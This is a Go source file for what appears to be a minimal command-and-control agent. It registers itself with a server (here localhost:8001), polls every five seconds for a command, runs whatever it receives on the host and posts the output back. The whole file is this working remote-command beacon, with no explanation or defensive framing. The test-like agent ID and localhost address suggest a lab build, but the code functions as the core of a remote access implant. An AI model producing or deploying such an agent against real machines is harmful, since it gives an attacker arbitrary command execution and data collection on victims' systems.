package main

import (
"bytes"
"encoding/json"
"fmt"
"net/http"
"os/exec"
"runtime"
"strings"
"time"
)

type AgentRegister struct {
ID       string `json:"id"`
Hostname string `json:"hostname"`
OS       string `json:"os"`
LastSeen int64  `json:"last_seen"`
}

type TaskResponse struct {
Command string `json:"command"`
}

type ResultPayload struct {
AgentID string `json:"agent_id"`
Output  string `json:"output"`
}

const (
ServerURL = "http://localhost:8001"
AgentID   = "test-01"
)

func main() {
for {
registerAgent()
cmd := checkIn()
if cmd != "" {
output := executeCommand(cmd)
sendResult(output)
}
time.Sleep(5 * time.Second)
}
}

func registerAgent() {
payload := AgentRegister{
ID:       AgentID,
Hostname: getHostname(),
OS:       runtime.GOOS,
LastSeen: time.Now().Unix(),
}
body, _ := json.Marshal(payload)
http.Post(ServerURL+"/register", "application/json", bytes.NewBuffer(body))
}

func checkIn() string {
payload := map[string]string{"agent_id": AgentID}
body, _ := json.Marshal(payload)
resp, err := http.Post(ServerURL+"/task", "application/json", bytes.NewBuffer(body))
if err != nil {
return ""
}
defer resp.Body.Close()
var task TaskResponse
json.NewDecoder(resp.Body).Decode(&task)
return task.Command
}

func executeCommand(command string) string {
parts := strings.Fields(command)
if len(parts) == 0 {
return ""
}
cmd := exec.Command(parts[0], parts[1:]...)
output, err := cmd.CombinedOutput()
if err != nil {
return fmt.Sprintf("Error: %s", err.Error())
}
return string(output)
}

func sendResult(output string) {
payload := ResultPayload{
AgentID: AgentID,
Output:  output,
}
body, _ := json.Marshal(payload)
http.Post(ServerURL+"/result", "application/json", bytes.NewBuffer(body))
}

func getHostname() string {
hostname, _ := exec.Command("hostname").Output()
return strings.TrimSpace(string(hostname))
}
